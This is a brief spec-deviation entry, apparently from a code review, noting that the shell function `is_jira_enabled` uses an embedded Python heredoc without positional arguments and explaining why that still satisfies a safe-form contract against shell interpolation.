  - **Spec source:** TEA safe-form contract, property 2 (positional argv).
  - **Spec text:** values ride as double-quoted words after a bare `-`, read via `sys.argv[N]`.
  - **Implementation:** `is_jira_enabled` takes no inputs, so its fence is `"${PF_PY:?…}" <<'PYEOF'` with no `-` and no argv words.
  - **Rationale:** property 2 governs values; there are none to pass. Property 1 (single-quoted heredoc) and 3 (zero interpolation) both hold. The sweep agrees — `uses_positional_argv` is only asserted on the pinned sites, which have inputs.
  - **Severity:** minor.
  - **Forward impact:** none.